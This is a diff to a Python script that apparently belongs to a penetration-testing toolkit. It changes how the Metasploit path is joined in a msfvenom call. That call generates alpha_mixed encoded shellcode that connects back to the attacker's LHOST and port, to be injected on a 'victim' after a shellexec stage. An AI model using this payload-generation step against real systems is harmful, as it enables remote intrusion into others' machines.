@@ -24,7 +24,7 @@ ipaddr = grab_ipaddress()
 #
 # metasploit_path here
 #
-msf_path = meta_path() + "/msfconsole"
+msf_path = meta_path() + "msfconsole"
 
 ################################################################
 #
@@ -126,7 +126,7 @@ except KeyboardInterrupt:
 
 print "   [*] Generating alpha_mixed shellcode to be injected after shellexec has been deployed on victim..."
 # grab msfvenom alphanumeric shellcode to be inserted into shellexec
-proc = subprocess.Popen("msfvenom -p %s EXITFUNC=thread LHOST=%s LPORT=%s %s --format raw -e x86/alpha_mixed BufferRegister=EAX" % (payload,ipaddr,port,url), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+proc = subprocess.Popen("%smsfvenom -p %s EXITFUNC=thread LHOST=%s LPORT=%s %s --format raw -e x86/alpha_mixed BufferRegister=EAX" % (meta_path(),payload,ipaddr,port,url), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 # read in stdout which will be our alphanumeric shellcode
 alpha_payload = proc.stdout.read()
 # generate a random filename this is going to be needed to read 150 bytes in at a time
